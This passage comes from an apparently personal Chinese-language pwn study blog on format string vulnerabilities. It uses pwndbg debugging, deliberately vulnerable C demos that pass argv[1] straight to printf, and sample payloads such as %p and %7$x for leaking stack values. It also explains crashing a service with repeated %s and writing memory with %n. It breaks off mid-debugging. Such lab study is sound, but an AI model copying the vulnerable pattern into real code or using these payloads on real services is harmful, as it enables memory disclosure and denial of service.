class="number">3.0</span>);</span><br></pre></td></tr></table></figure><p>但是printf是怎么知道有多少个值的？</p><p>格式化字符串决定了printf打印的参数类型，那么这些参数在哪里？</p><p>比如给定了许多%s,但没有指定参数传递，printf如何打印？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello %s!\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>来看看会调用printf时的汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> b=<span class="number">2</span>;</span><br><span class="line">  <span class="type">int</span> c=<span class="number">3</span>;</span><br><span class="line">  <span class="type">int</span> d=<span class="number">4</span>;</span><br><span class="line">  <span class="type">int</span> e=<span class="number">5</span>;</span><br><span class="line">  <span class="type">int</span> f=<span class="number">6</span>;</span><br><span class="line">  <span class="type">int</span> g=<span class="number">7</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d %d %d %d\n&quot;</span>,a,b,c,d,e,f,g);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启用gdb，看printf是怎么调用函数的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">For help, type <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">pwndbg: loaded <span class="number">161</span> pwndbg commands <span class="keyword">and</span> <span class="number">47</span> shell commands. Type pwndbg [--shell | --all] [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created $rebase, $base, $<span class="function">ida GDB <span class="title">functions</span> <span class="params">(can be used with print/<span class="keyword">break</span>)</span></span></span><br><span class="line"><span class="function">Reading symbols from ./<span class="keyword">do</span>...</span></span><br><span class="line"><span class="function"><span class="params">(No debugging symbols found in ./<span class="keyword">do</span>)</span></span></span><br><span class="line"><span class="function">------- tip of the <span class="title">day</span> <span class="params">(disable with set show-tips off)</span> -------</span></span><br><span class="line"><span class="function">Use Pwndbg&#x27;s config <span class="keyword">and</span> theme commands to tune its configuration <span class="keyword">and</span> theme colors!</span></span><br><span class="line"><span class="function">pwndbg&gt; disass main</span></span><br><span class="line"><span class="function">Dump of assembler code <span class="keyword">for</span> function main:</span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001139</span> &lt;+<span class="number">0</span>&gt;:     push   rbp</span></span><br><span class="line"><span class="function">   <span class="number">0x000000000000113a</span> &lt;+<span class="number">1</span>&gt;:     mov    rbp,rsp</span></span><br><span class="line"><span class="function">   <span class="number">0x000000000000113d</span> &lt;+<span class="number">4</span>&gt;:     sub    rsp,<span class="number">0x30</span></span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001141</span> &lt;+<span class="number">8</span>&gt;:     mov    DWORD PTR [rbp<span class="number">-0x24</span>],edi</span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001144</span> &lt;+<span class="number">11</span>&gt;:    mov    QWORD PTR [rbp<span class="number">-0x30</span>],rsi</span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001148</span> &lt;+<span class="number">15</span>&gt;:    mov    DWORD PTR [rbp<span class="number">-0x4</span>],<span class="number">0x1</span>                                </span></span><br><span class="line"><span class="function">   <span class="number">0x000000000000114f</span> &lt;+<span class="number">22</span>&gt;:    mov    DWORD PTR [rbp<span class="number">-0x8</span>],<span class="number">0x2</span>                                                                 </span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001156</span> &lt;+<span class="number">29</span>&gt;:    mov    DWORD PTR [rbp<span class="number">-0xc</span>],<span class="number">0x3</span>                                                                 </span></span><br><span class="line"><span class="function">   <span class="number">0x000000000000115d</span> &lt;+<span class="number">36</span>&gt;:    mov    DWORD PTR [rbp<span class="number">-0x10</span>],<span class="number">0x4</span>                                                                </span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001164</span> &lt;+<span class="number">43</span>&gt;:    mov    DWORD PTR [rbp<span class="number">-0x14</span>],<span class="number">0x5</span>                                                                </span></span><br><span class="line"><span class="function">   <span class="number">0x000000000000116b</span> &lt;+<span class="number">50</span>&gt;:    mov    DWORD PTR [rbp<span class="number">-0x18</span>],<span class="number">0x6</span>                                                                </span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001172</span> &lt;+<span class="number">57</span>&gt;:    mov    DWORD PTR [rbp<span class="number">-0x1c</span>],<span class="number">0x7</span>                                                                </span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001179</span> &lt;+<span class="number">64</span>&gt;:    mov    r8d,DWORD PTR [rbp<span class="number">-0x14</span>]                                                                </span></span><br><span class="line"><span class="function">   <span class="number">0x000000000000117d</span> &lt;+<span class="number">68</span>&gt;:    mov    edi,DWORD PTR [rbp<span class="number">-0x10</span>]                                                                </span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001180</span> &lt;+<span class="number">71</span>&gt;:    mov    ecx,DWORD PTR [rbp<span class="number">-0xc</span>]                                                                 </span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001183</span> &lt;+<span class="number">74</span>&gt;:    mov    edx,DWORD PTR [rbp<span class="number">-0x8</span>]                                                                 </span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001186</span> &lt;+<span class="number">77</span>&gt;:    mov    eax,DWORD PTR [rbp<span class="number">-0x4</span>]                                                                 </span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001189</span> &lt;+<span class="number">80</span>&gt;:    mov    esi,DWORD PTR [rbp<span class="number">-0x1c</span>]</span></span><br><span class="line"><span class="function">   <span class="number">0x000000000000118c</span> &lt;+<span class="number">83</span>&gt;:    push   rsi</span></span><br><span class="line"><span class="function">   <span class="number">0x000000000000118d</span> &lt;+<span class="number">84</span>&gt;:    mov    esi,DWORD PTR [rbp<span class="number">-0x18</span>]</span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001190</span> &lt;+<span class="number">87</span>&gt;:    push   rsi</span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001191</span> &lt;+<span class="number">88</span>&gt;:    mov    r9d,r8d</span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001194</span> &lt;+<span class="number">91</span>&gt;:    mov    r8d,edi</span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001197</span> &lt;+<span class="number">94</span>&gt;:    mov    esi,eax</span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001199</span> &lt;+<span class="number">96</span>&gt;:    lea    rax,[rip+<span class="number">0xe64</span>]        # <span class="number">0x2004</span></span></span><br><span class="line"><span class="function">   <span class="number">0x00000000000011a0</span> &lt;+<span class="number">103</span>&gt;:   mov    rdi,rax</span></span><br><span class="line"><span class="function">   <span class="number">0x00000000000011a3</span> &lt;+<span class="number">106</span>&gt;:   mov    eax,<span class="number">0x0</span></span></span><br><span class="line"><span class="function">   <span class="number">0x00000000000011a8</span> &lt;+<span class="number">111</span>&gt;:   call   <span class="number">0x1030</span> &lt;printf@plt&gt;</span></span><br><span class="line"><span class="function">   <span class="number">0x00000000000011ad</span> &lt;+<span class="number">116</span>&gt;:   add    rsp,<span class="number">0x10</span></span></span><br><span class="line"><span class="function">   <span class="number">0x00000000000011b1</span> &lt;+<span class="number">120</span>&gt;:   mov    eax,<span class="number">0x0</span></span></span><br><span class="line"><span class="function">   <span class="number">0x00000000000011b6</span> &lt;+<span class="number">125</span>&gt;:   leave</span></span><br><span class="line"><span class="function">   <span class="number">0x00000000000011b7</span> &lt;+<span class="number">126</span>&gt;:   ret</span></span><br><span class="line"><span class="function">End of assembler dump.</span></span><br><span class="line"><span class="function">pwndbg&gt; </span></span><br></pre></td></tr></table></figure><p>在&lt;111&gt;处调用了printf</p><p>在此处下断点 b *main +111</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *main+<span class="number">111</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x11a8</span></span><br><span class="line">pwndbg&gt; r</span><br></pre></td></tr></table></figure><p>运行后看现在的寄存器里有什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info reg</span><br><span class="line">rax            <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">rbx            <span class="number">0x7fffffffdf28</span>      <span class="number">140737488346920</span></span><br><span class="line">rcx            <span class="number">0x3</span>                 <span class="number">3</span></span><br><span class="line">rdx            <span class="number">0x2</span>                 <span class="number">2</span></span><br><span class="line">rsi            <span class="number">0x1</span>                 <span class="number">1</span></span><br><span class="line">rdi            <span class="number">0x555555556004</span>      <span class="number">93824992239620</span></span><br><span class="line">rbp            <span class="number">0x7fffffffde10</span>      <span class="number">0x7fffffffde10</span></span><br><span class="line">rsp            <span class="number">0x7fffffffddd0</span>      <span class="number">0x7fffffffddd0</span></span><br><span class="line">r8             <span class="number">0x4</span>                 <span class="number">4</span></span><br><span class="line">r9             <span class="number">0x5</span>                 <span class="number">5</span></span><br><span class="line">r10            <span class="number">0x7fffffffdb40</span>      <span class="number">140737488345920</span></span><br><span class="line">r11            <span class="number">0x206</span>               <span class="number">518</span></span><br><span class="line">r12            <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">r13            <span class="number">0x7fffffffdf38</span>      <span class="number">140737488346936</span></span><br><span class="line">r14            <span class="number">0x7ffff7ffd000</span>      <span class="number">140737354125312</span></span><br><span class="line">r15            <span class="number">0x555555557dd8</span>      <span class="number">93824992247256</span></span><br><span class="line">rip            <span class="number">0x5555555551a8</span>      <span class="number">0x5555555551a8</span> &lt;main+<span class="number">111</span>&gt;</span><br><span class="line">eflags         <span class="number">0x202</span>               [ IF ]</span><br><span class="line">cs             <span class="number">0x33</span>                <span class="number">51</span></span><br><span class="line">ss             <span class="number">0x2b</span>                <span class="number">43</span></span><br><span class="line">ds             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">es             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">fs             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">gs             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><p>对于寄存器的一些解释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">rax (<span class="number">0x0</span>): 通常用作返回值寄存器。值为 <span class="number">0</span> 表示前一个函数调用返回了 <span class="number">0</span>（通常表示成功，或者是布尔类型的 <span class="literal">false</span>）。</span><br><span class="line">rbx (<span class="number">0x7fffffffdf28</span>): rbx 通常是一个保存寄存器，它的值为 <span class="number">140737488346920</span>（内存地址），说明它保存了某个值或指向某个数据。</span><br><span class="line">rcx (<span class="number">0x3</span>): rcx 经常在某些函数调用约定中用于传递参数。当前值为 <span class="number">3</span>，表明它可能作为一个函数的第三个参数或计数值。</span><br><span class="line">rdx (<span class="number">0x2</span>): rdx 通常用于传递第二个函数参数，当前值为 <span class="number">2</span>，表明这个值可能被用作函数调用中的某个参数。</span><br><span class="line">rsi (<span class="number">0x1</span>): rsi 通常是传递第一个函数参数。当前值为 <span class="number">1</span>，很可能是某个函数的标志参数或索引。</span><br><span class="line">rdi (<span class="number">0x555555556004</span>): rdi 经常传递第一个函数参数，当前值为 <span class="number">93824992239620</span>，这是一个内存地址，可能指向函数的输入数据或结构体。</span><br><span class="line">rbp (<span class="number">0x7fffffffde10</span>): rbp 是基址指针，通常用于指向栈帧的基址。当前值指向栈帧顶部，表示函数的局部变量和参数保存在这一段内存区域中。</span><br><span class="line">rsp (<span class="number">0x7fffffffddd0</span>): rsp 是栈指针，表示当前栈的顶部。当前值 <span class="number">0x7fffffffddd0</span> 小于 rbp，符合栈从高地址向低地址增长的特性。</span><br><span class="line">r8 (<span class="number">0x4</span>), r9 (<span class="number">0x5</span>): 这些寄存器在某些调用约定下用于传递函数参数，值分别为 <span class="number">4</span> 和 <span class="number">5</span>。</span><br><span class="line">r10 (<span class="number">0x7fffffffdb40</span>): 这是一个内存地址，可能用作系统调用的第三个参数或者是某个函数的额外参数。</span><br><span class="line">r11 (<span class="number">0x206</span>): 通常用作标志寄存器。当前值 <span class="number">0x206</span> 可能与系统调用相关。</span><br><span class="line">r12 (<span class="number">0x0</span>): r12 是一个保存寄存器，当前值为 <span class="number">0</span>，表示它可能还未被使用。</span><br><span class="line">r13 (<span class="number">0x7fffffffdf38</span>): 这是一个内存地址，通常保存了一个值或指向某个数据区域。</span><br><span class="line">r14 (<span class="number">0x7ffff7ffd000</span>): 这个地址位于共享库的区域（通常在高地址），可能是指向某个动态库的基地址。</span><br><span class="line">r15 (<span class="number">0x555555557dd8</span>): 这个地址位于程序的代码段或数据段，可能指向某个全局变量或静态数据。</span><br></pre></td></tr></table></figure><p>rdi 里是格式化字符串</p><p>前面显示了12345，67呢</p><p>在这里</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">4</span>gx $rsp</span><br><span class="line"><span class="number">0x7fffffffddd0</span>: <span class="number">0x0000000000000006</span>      <span class="number">0x0000000000000007</span></span><br><span class="line"><span class="number">0x7fffffffdde0</span>: <span class="number">0x00007fffffffdf28</span>      <span class="number">0x0000000100000000</span></span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><p>数据依次排列而printf依次读取</p><h3 id="格式化字符串漏洞的条件"><a href="#格式化字符串漏洞的条件" class="headerlink" title="格式化字符串漏洞的条件"></a>格式化字符串漏洞的条件</h3><p>用户能控制传递给printf的首个参数。格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式化字符串在循环中是图灵完备的，以下这个项目基于运行在while循环中的printf,brainfuck</p><p><a class="link"   href="https://github.com/HexHive/printbf" >https://github.com/HexHive/printbf<i class="fas fa-external-link-alt"></i></a></p><h3 id="其他格式化字符串函数"><a href="#其他格式化字符串函数" class="headerlink" title="其他格式化字符串函数"></a>其他格式化字符串函数</h3><ul><li><p>用于内部逻辑，而不是输入&#x2F;输出操作（例如，<code>sprintf</code>，<code>snprintf</code>，<code>sscanf</code>）</p></li><li><p>用于日志记录（例如，<code>fprintf</code>）</p></li><li><p>用于输入（例如，<code>scanf</code></p></li></ul><h2 id="内存泄漏"><a href="#内存泄漏" class="headerlink" title="内存泄漏"></a>内存泄漏</h2><p>可以使用的字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%c: read a <span class="type">char</span> off the <span class="built_in">stack</span>   泄露一个字节</span><br><span class="line">%d, %i, %x: read an <span class="title function_">int</span> <span class="params">(<span class="number">4</span> bytes)</span> off the <span class="built_in">stack</span> 以十进制整数形式泄露4字节</span><br><span class="line">%x: read an <span class="title function_">int</span> <span class="params">(<span class="number">4</span> bytes)</span> in hex  以十六进制整数形式泄露4字节</span><br><span class="line">%s: dereference a pointer and read out bytes until a null byte  解引用指针，并读取任意字节，直到遇到null字节，这些字节可能是可显或不可显</span><br></pre></td></tr></table></figure><p>格式化字符串也能使用大小前缀，或叫大小修饰符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%x leaks <span class="number">4</span> bytes</span><br><span class="line">%hx leaks <span class="number">2</span> bytes</span><br><span class="line">%hhx leaks <span class="number">1</span> byte</span><br><span class="line">%lx leaks <span class="number">8</span> bytes</span><br></pre></td></tr></table></figure><h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>demo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> fmt_str[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *secret_value = <span class="string">&quot;my secret value&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">strcpy</span>(fmt_str, argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">strcat</span>(fmt_str, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(fmt_str, <span class="number">0xBEEF1337</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(pwn㉿kali)-[~/桌面]</span><br><span class="line">└─$ ./<span class="keyword">do</span> <span class="string">&quot;leak:%p&quot;</span></span><br><span class="line">leak:<span class="number">0xbeef1337</span></span><br><span class="line"></span><br><span class="line">┌──(pwn㉿kali)-[~/桌面]</span><br><span class="line">└─$ ./<span class="keyword">do</span> <span class="string">&quot;leak:%p %p %p %P&quot;</span></span><br><span class="line">leak:<span class="number">0xbeef1337</span> <span class="number">0x10</span> (nil) %P</span><br></pre></td></tr></table></figure><p>那么如何获取到secret_value值呢，它在栈上，理论上来说只要一直%p就有机会读到一个像栈地址的值</p><p>使用$可以读取指定位置的参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">7</span>$x - print the <span class="number">7</span>th <span class="title function_">parameter</span> <span class="params">(on the <span class="built_in">stack</span>)</span><span class="comment">//打印栈上的第七个值</span></span><br></pre></td></tr></table></figure><p>但是我这里是不行的</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.001.8z6hda2ird.webp"                                        ></p><p>作者这里是能成功的</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.002.pfap28evc.webp"                                        ></p><p>怀疑是不同版本安全策略的问题，栈地址到别的地方去了</p><p><strong>一些小技巧总结</strong></p><blockquote><ol><li><p>利用%x来获取对应栈的内存，但建议使用%p，可以不用考虑位数的区别。</p></li><li><p>利用%s来获取变量所对应地址的内容，只不过有零截断。</p></li><li><p>利用%order$x来获取指定参数的值，利用%order$s来获取指定参数对应地址的内容</p></li></ol></blockquote><h2 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h2><p>用户不能直接提供字符串，而是由他们的行为自动生成。可能导致printf错误解析数据，比如使用%s解析一个指针。</p><p>不需要计算出具体的位置，只需要输入一大堆%s,遇到无法解析的就可以使程序产生错误，这一利用，虽然攻击者本身似乎并不能控制程序，但是这样却可以造成程序不可用。比如说，如果远程服务有一个格式化字符串漏洞，那么我们就可以攻击其可用性，使服务崩溃，进而使得用户不能够访问。</p><h2 id="内存覆盖（写入数据）"><a href="#内存覆盖（写入数据）" class="headerlink" title="内存覆盖（写入数据）"></a>内存覆盖（写入数据）</h2><p>%n会对传入的指针解引用，然后把已输出的字符串的字节数写到该地址，使用%n可以在输出的同时知道字符的长度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> namelength;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s%n&quot;</span>, name, &amp;namelength);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The name was %d bytes long!&quot;</span>, namelength);</span><br></pre></td></tr></table></figure><p>demo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> fmt_str[<span class="number">256</span>];</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line">        <span class="type">int</span> *print_flag=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        *print_flag=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *secret_value = <span class="string">&quot;my secret value&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">strcpy</span>(fmt_str, argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">strcat</span>(fmt_str, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(fmt_str, <span class="number">0xBEEF1337</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(*print_flag)&#123;</span><br><span class="line">                <span class="type">int</span> fd=open(<span class="string">&quot;/catflag&quot;</span>,O_RDONLY);</span><br><span class="line">                read(fd,buf,<span class="number">256</span>);</span><br><span class="line">                write(<span class="number">1</span>,buf,<span class="number">256</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(pwn㉿kali)-[~/桌面]</span><br><span class="line">└─$ ./<span class="keyword">do</span> <span class="string">&#x27;%x&#x27;</span></span><br><span class="line">beef1337</span><br></pre></td></tr></table></figure><p>使用gdb进行调试，在main下断点，然后运行</p><p>反编译main函数，找到 if(*print_flag)在哪开始比较</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.003.8z6hda2tzn.webp"                                        ></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test eax, eax 进行的是按位与运算（AND 操作）。对于寄存器 eax，执行的是 eax &amp; eax。</span><br><span class="line">由于任何值与自身按位与的结果就是自身，所以这条指令的结果要么是非零值，要么是零：</span><br><span class="line">如果 eax 中的值是 <span class="number">0</span>，那么 eax &amp; eax = <span class="number">0</span>。</span><br><span class="line">如果 eax 中的值不是 <span class="number">0</span>，那么 eax &amp; eax ≠ <span class="number">0</span>。</span><br></pre></td></tr></table></figure><p>这一段可能是在进行比较，后面有个je可以执行跳转</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000401216</span> &lt;+<span class="number">144</span>&gt;:   call   <span class="number">0x401060</span> &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line"><span class="number">0x000000000040121b</span> &lt;+<span class="number">149</span>&gt;:   mov    rax,QWORD PTR [rbp<span class="number">-0x8</span>]</span><br><span class="line"><span class="number">0x000000000040121f</span> &lt;+<span class="number">153</span>&gt;:   mov    eax,DWORD PTR [rax]</span><br><span class="line"><span class="number">0x0000000000401221</span> &lt;+<span class="number">155</span>&gt;:   test   eax,eax</span><br><span class="line"><span class="number">0x0000000000401223</span> &lt;+<span class="number">157</span>&gt;:   je     <span class="number">0x401273</span> &lt;main+<span class="number">237</span>&gt;</span><br><span class="line"><span class="number">0x0000000000401225</span> &lt;+<span class="number">159</span>&gt;:   mov    esi,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x000000000040122a</span> &lt;+<span class="number">164</span>&gt;:   lea    rax,[rip+<span class="number">0xde3</span>]        # <span class="number">0x402014</span></span><br></pre></td></tr></table></figure><p><u>eax&#x3D;rax rax&#x3D;rbp-0x8</u></p><p>现在输出rbp-0x8 rsp和它们之间的距离</p><p><img                         lazyload                       alt="image"                       